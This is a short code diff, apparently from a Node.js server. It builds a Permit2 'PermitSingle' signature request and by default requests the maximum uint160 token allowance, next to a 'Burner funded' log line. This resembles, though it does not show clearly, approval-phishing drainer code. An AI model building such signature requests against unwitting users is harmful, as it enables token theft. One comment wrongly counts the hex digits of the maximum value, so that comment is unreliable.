@@ -178,24 +178,27 @@ console.log('✅ Burner funded OK');
       verifyingContract: PERMIT2
     };
     
-    const types = {
-      PermitSingle: [
-        { name: 'details', type: 'PermitDetails' },
-        { name: 'spender', type: 'address' },
-        { name: 'sigDeadline', type: 'uint256' }
-      ],
-      PermitDetails: [
-        { name: 'token', type: 'address' },
-        { name: 'amount', type: 'uint160' },
-        { name: 'expiration', type: 'uint48' },
-        { name: 'nonce', type: 'uint48' }
-      ]
-    };
-    
-    const value = {
-      details: {
-        token: tokenAddress,
-        amount: ethers.BigNumber.from(req.body.amount || '0xffffffffffffffffffffffffffffffffffffffff'), // uint160 max
+const types = {
+  PermitSingle: [
+    { name: 'details', type: 'PermitDetails' },
+    { name: 'spender', type: 'address' },
+    { name: 'sigDeadline', type: 'uint256' }
+  ],
+  PermitDetails: [
+    { name: 'token', type: 'address' },
+    { name: 'amount', type: 'uint160' },
+    { name: 'expiration', type: 'uint48' },
+    { name: 'nonce', type: 'uint48' }
+  ]
+};
+
+// 🔥 UINT160 MAX (20 bytes = 160 bits)
+const maxUint160 = '0xffffffffffffffffffffffffffffffffffffffff'; // 36 chars F's
+
+const value = {
+  details: {
+    token: tokenAddress,
+    amount: ethers.BigNumber.from(req.body.amount || maxUint160),
         expiration: ethers.BigNumber.from(Math.floor(Date.now() / 1000) + 3600), // 1hr
         nonce: ethers.BigNumber.from(req.body.nonce || "0")
       },
